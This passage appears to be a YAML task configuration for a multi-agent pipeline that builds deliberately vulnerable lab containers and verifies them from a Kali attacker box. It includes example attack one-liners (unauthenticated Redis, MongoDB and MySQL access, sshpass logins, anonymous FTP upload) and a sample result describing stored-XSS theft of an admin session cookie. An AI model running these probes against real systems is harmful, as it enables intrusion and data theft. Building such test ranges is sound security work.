    Using the atom's Testing Guidance:
      - Write a minimal Bash one-liner or short block that verifies the security
        state was achieved (e.g. confirms the SUID bit is set, the share is
        browseable, the file is readable by the intended user).
      - Do NOT include a shebang line.
      - This snippet runs INSIDE the target container. Always use `127.0.0.1`
        (not a hostname) when connecting to local services (e.g.
        `mongosh --host 127.0.0.1`, `redis-cli -h 127.0.0.1`, `psql -h 127.0.0.1`).
        Never use `target`, `localhost`, or a box hostname here.

    STEP 5 — Generate the attack_snippet (or null).
    Determine whether THIS ATOM BY ITSELF exposes a remotely exploitable
    surface — meaning an attacker on a separate machine could probe or exploit
    it over the network using ONLY the state this atom produces.

    CRITICAL: "Infrastructure" atoms that merely create resources (users,
    files, packages, directories) do NOT have their own attack surface even
    if a LATER atom turns them into one. The attack_snippet for those atoms
    MUST be null. The remote surface belongs to the atom that ACTIVATES it.

    Examples of atoms that MUST have attack_snippet = null:
      - create_user:        creates an OS user; SSH login is proven by the
                            weak_service_password / SSH-enabling atom that
                            runs after it.
      - install_package:    installs a package; exposure belongs to whatever
                            atom configures the service.
      - set_suid, set_capability, sensitive_file (no service):
                            local-only effects, fully covered by Layer 1.

      - If YES — this atom itself brings a service online or directly exposes
        the vulnerability over the network:
        Write a Bash command that probes the vulnerability from an attacker's
        perspective. The attacker container is Kali-based and addresses the
        target by hostname `{target_hostname}` on a Docker bridge network.
        Always use exactly this hostname — do not substitute `target` or any
        other value.

        AVAILABLE TOOLS on the attacker container (pre-installed):
          bash, curl, wget, nmap, hydra, smbclient, sshpass, openssh-client,
          netcat-traditional, ncat, metasploit-framework,
          redis-cli (from redis-tools), psql (from postgresql-client),
          mysql (from default-mysql-client), mongosh,
          ftp, dig/nslookup (from dnsutils), nikto, enum4linux

        Prefer tools from this list in your attack_snippet. Any tool NOT in
        this list will be dynamically installed at test time, but using a
        listed tool avoids delays. For HTTP-based probes, prefer curl.

        Examples (replace TARGET_HOST with `{target_hostname}`):
          - samba_insecure_share:       `smbclient -L //TARGET_HOST/<share_name> -N`
          - weak_service_password (SSH):`sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <username>@TARGET_HOST id`
          - redis_disable_auth:         `redis-cli -h TARGET_HOST ping && redis-cli -h TARGET_HOST keys '*'`
          - postgres_rce:               `PGPASSWORD='' psql -U <db_user> -h TARGET_HOST -c '\du'`
          - database_expose (MySQL):    `mysql -h TARGET_HOST -u root --password= -e 'show databases;'`
          - mongodb_disable_auth:       `mongosh --host TARGET_HOST --eval "db.adminCommand('listDatabases')"`
          - ftp_anon_upload:            `curl -T /etc/hostname ftp://TARGET_HOST/<upload_dir>/test.txt --user anonymous:`
        Do NOT include a shebang line.
      - If NO — this atom only creates infra (users, files, packages) or
        only affects local state: set attack_snippet to null.
        These atoms are fully covered by Layer 1; the remote surface is
        proven by a later activating atom's L2 probe.

    STEP 6 — Build the GeneratedSnippet.
    Create a GeneratedSnippet with:
      - `atom_name`: the atom's `name`
      - `code_snippet`: your generated Bash commands (string)
      - `testing_snippet`: your verification commands (string)
      - `attack_snippet`: your attack probe command (string or null)
      - `mapped_atom`: the full MappedAtom object (name, context, parameters)
      - `validated`: false

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations, no trailing comments. Do all reasoning internally.
    Do NOT write any text after the closing `}` of the JSON object.

    IMPORTANT:
    - You MUST call `read_atom` for this atom. No exceptions.
    - The atom markdown is a scaffold. The `context` field is your brief for
      security intent — use it to make decisions the template leaves open.
    - For attack_snippet: ONLY atoms that themselves bring a network-facing
      service online (or directly expose the vulnerability over the network)
      get one. Infrastructure atoms (create_user, install_package, set_suid,
      sensitive_file not exposed via a service) must have attack_snippet set
      to null — their remote surface, if any, is proven by the later atom
      that activates it.
  expected_output: >
    A single valid JSON object — no markdown, no surrounding text.
    Start the response with { and end with }. All keys must be quoted strings.
    The JSON object must be a GeneratedSnippet with: `atom_name` (str),
    `code_snippet` (str), `testing_snippet` (str), `attack_snippet` (str or null),
    `mapped_atom` (MappedAtom object), `validated` (false).
  agent: snippet_generation_agent

validate_snippets_task:
  description: >
    You are judging the output of a command that was executed inside a Docker
    container as part of vulnerability snippet testing.

    CONTEXT:
    - Atom: {atom_name}
    - Security intent: {atom_context}
    - Test layer: {layer}
    - Command executed: {snippet_executed}

    RAW OUTPUT:
    - Exit code: {exit_code}
    - STDOUT:
    {stdout}
    - STDERR:
    {stderr}

    YOUR TASK:
    Analyze the exit code, stdout, and stderr in the context of the atom's
    security intent and the command that was executed. Determine whether the
    output indicates the intended configuration or vulnerability was successfully
    applied (for Layer 1 internal state checks) or successfully exploited
    (for Layer 2 external attack probes).

    Consider:
    1. Does the exit code indicate success? (0 is usually good, but some tools
       return 0 on partial failure or non-zero on success with warnings.)
    2. Are there positive indicators in stdout? (Expected usernames, share names,
       file contents, permission bits, service status messages, etc.)
    3. Are there failure indicators in stderr? (Access denied, connection refused,
       authentication failed, etc. — but warnings and deprecation notices are
       NOT failures.)
    4. Is the output consistent with what the atom's security intent describes?

    Return a TestVerdict with:
    - `passed`: true if the evidence confirms success, false if it indicates failure.
    - `reasoning`: 1-3 sentences citing specific evidence from the output.
  expected_output: >
    A single raw JSON object — no markdown, no surrounding text, no reasoning
    before or after. Start the response with { and end with }.
    Fields: `passed` (boolean) and `reasoning` (1-3 sentence string).
  agent: testing_agent

diagnose_snippet_task:
  description: >
    A vulnerability snippet failed validation during Docker container testing.
    Diagnose the failure and produce a corrected version.

    FAILURE CONTEXT:
    - Atom: {atom_name}
    - Security intent: {atom_context}
    - Parameters: {atom_parameters}
    - Retry attempt: {attempt_number} of 2

    ORIGINAL SNIPPETS:
    - Code snippet that was applied:
    {original_code_snippet}

    - Testing snippet that was run:
    {original_testing_snippet}

    FAILURE EVIDENCE:
    - Stderr from applying code_snippet:
    {apply_stderr}

    - Testing snippet exit code: {l1_exit_code}
    - Testing snippet stdout:
    {l1_stdout}
    - Testing snippet stderr:
    {l1_stderr}

    - Testing Agent's verdict: {verdict_reasoning}

    YOUR TASK:
    1. Use `read_atom` to read the full atom definition for "{atom_name}" and
       understand the Logic Requirements, Synthesis Guidance, and Testing Guidance.
    2. Analyze all failure evidence — apply_stderr, l1 output, and verdict reasoning.
    5. Optionally use `exec_in_container` with container_id "{target_container_name}" to run
       diagnostic commands and inspect the actual container state.
    4. Determine the root cause of the failure.
    5. Produce a complete, idempotent replacement for both code_snippet and
       testing_snippet that fixes the issue.

    Return a DiagnosticResult with:
    - `fixed_code_snippet`: The corrected Bash commands (no shebang).
    - `fixed_testing_snippet`: The corrected verification commands (no shebang).
    - `diagnosis`: 2-4 sentence explanation of root cause and fix.
    - `confidence`: "high", "medium", or "low".
  expected_output: >
    A single raw JSON object — no markdown, no surrounding text, no reasoning
    before or after. Start the response with { and end with }.
    Fields: `fixed_code_snippet` (str), `fixed_testing_snippet` (str),
    `diagnosis` (str), `confidence` (str).
  agent: diagnostic_agent

fix_attack_snippet_task:
  description: >
    A Layer 2 (external attack probe) snippet failed for a custom web application.
    Layer 1 passed — the app is WORKING and VULNERABLE. Your job is to fix the
    attack snippet so it successfully exploits the vulnerability from the attacker
    container.

    APP SOURCE ({app_filename}):
    {app_source}

    ATTACK GOAL:
    {attack_goal}

    SYNTHESIS CONTEXT:
    {synthesis_context}

    FAILED ATTACK SNIPPET:
    {failed_attack_snippet}

    EXECUTION OUTPUT:
    - Exit code: {l2_exit_code}
    - Stdout:
    {l2_stdout}
    - Stderr:
    {l2_stderr}

    VERDICT REASONING (why the testing agent judged it as failed):
    {verdict_reasoning}

    L1 TESTING SNIPPET (proof the vulnerability exists internally):
    {testing_snippet}

    L1 OUTPUT (exit code {l1_exit_code}):
    {l1_stdout}

    DEPLOY SNIPPET (how the app was deployed):
    {deploy_snippet}

    Port: {port}. Attack agent attempt: {attempt_number} of {max_attempts}.

    YOUR TASK:
    1. Read the app source carefully — note the exact endpoint paths, parameter
       names, expected request format, and response structure.
    2. Compare the failed attack snippet against the app source to find mismatches.
    3. Use exec_in_attacker to probe the target incrementally — curl endpoints,
       check response format, verify the vulnerability is exploitable externally.
    4. Use exec_in_target if needed to inspect logs or service state.
    5. Construct and TEST a fixed attack snippet using exec_in_attacker.
    6. Return the working snippet.
  expected_output: >
    A single raw JSON object — no markdown, no surrounding text, no reasoning
    before or after. Start the response with { and end with }.
    Fields: fixed_attack_snippet (str), diagnosis (str), confidence (str).
  agent: attack_agent

attack_orchestrator_task:
  description: >
    Validate a vulnerable web application: first confirm it is deployed correctly
    (L1), then execute the exploit (L2).

    APP: {app_filename}
    APP SOURCE:
    {app_source}

    TESTING SNIPPET (L1 bash check):
    {testing_snippet}

    ATTACK OBJECTIVE (L2 multi-step task):
    {attack_objective}

    TARGET BASE URL: http://target:{port}
    SYNTHESIS CONTEXT: {synthesis_context}

    ATTEMPT: {attempt_number} of {max_attempts}
    {failure_context}

    Execute the L1 check and L2 attack objective using your tools. Return your
    verdict as an AttackOrchestratorResult.

    IMPORTANT: After using your tools, you MUST synthesize your findings and return
    a final JSON result. Do NOT just return tool call results — analyze them and
    produce the AttackOrchestratorResult JSON as your final answer.
  expected_output: >
    A single raw JSON object — no markdown, no surrounding text.
    Fields: l1_passed (bool), l2_passed (bool), l1_evidence (str),
    l2_evidence (str), reasoning (str), used_browser (bool).

    Example:
    {
      "l1_passed": true,
      "l2_passed": true,
      "l1_evidence": "Web server responding on port 3000. XSS payload present in comments table.",
      "l2_evidence": "Exfil file contains: connect.sid=s%3AaBcDeFg",
      "reasoning": "L1 verified app deployment. L2 successfully exfiltrated admin session cookie via stored XSS.",
      "used_browser": true
    }
  agent: attack_orchestrator_agent
